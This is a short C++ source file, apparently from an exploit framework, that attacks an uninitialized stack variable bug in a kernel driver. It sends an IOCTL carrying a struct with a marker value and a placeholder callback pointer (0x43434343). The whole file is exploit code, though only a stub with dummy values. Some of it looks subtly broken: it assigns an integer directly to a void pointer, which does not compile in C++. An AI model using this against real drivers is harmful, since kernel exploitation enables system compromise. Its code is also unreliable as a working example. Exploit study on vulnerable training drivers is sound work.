#include "UninitializedStackVariable.h"

bool 
ExploitUninitializedStackVariable::exploit() {
	
	struct UninitializedStackVariableObject {
		DWORD unknown;
		void *callback;
	};
	
	UninitializedStackVariableObject obj;
	obj.unknown = 0xDEADC0DE;
	obj.callback = 0x43434343;
	
	bool ret = driver.SendIOCTL (
		ExploitUninitializedStackVariable::Ioctl_Code,
		&obj,
		sizeof(obj)
	);
	
	return ret;
}
